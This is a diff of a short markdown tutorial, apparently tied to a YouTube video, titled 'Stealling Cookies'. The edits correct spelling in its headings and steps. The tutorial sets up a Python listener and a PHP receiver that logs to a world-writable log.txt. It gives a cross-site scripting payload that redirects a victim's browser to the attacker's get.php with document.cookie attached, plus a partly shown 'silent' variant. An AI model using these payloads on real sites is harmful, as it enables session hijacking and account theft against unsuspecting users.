@@ -1,11 +1,11 @@
 # Stealling Cookies
 
-All Payload that used from this Youtube Video
+All Payload used from this YouTube Video
 
 https://youtu.be/Kh1sgI5yLdk
 
 
-# Takeing The Cookie From Python3 Server Listener
+# Take the Cookie From Python3 Server Listener
 
 1 - Strat Python Server:
 
@@ -31,7 +31,7 @@ YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!
 
 # Wirte PHP Code To Take the Cookie
 
-1 - Go to html File:
+1 - Go to HTML File:
 
 [~] YasserREED> cd  /var/www/html
 
@@ -55,9 +55,9 @@ YasserREED> sudo chmod 777 log.txt
 
 <script> window.location='https://127.0.0.1/get.php?cookie='+document.cookie </script> 
 
-2 - Paste into input filed.
+2 - Paste into the input filed.
 
-3 - Check log.txt. //if not showen you can refresh the page 🔄
+3 - Check log.txt. //if not shown you can refresh the page 🔄
 
 # Take the cookie Silence by get.php and send it to log.txt
 
@@ -69,7 +69,7 @@ YasserREED> sudo chmod 777 log.txt
 </script>
 
 
-2 - Paste into input filed.
+2 - Paste into the input field.
 
-3 - Check log.txt //if not showen you can refresh the page 🔄
+3 - Check log.txt //if not shown you can refresh the page 🔄
 
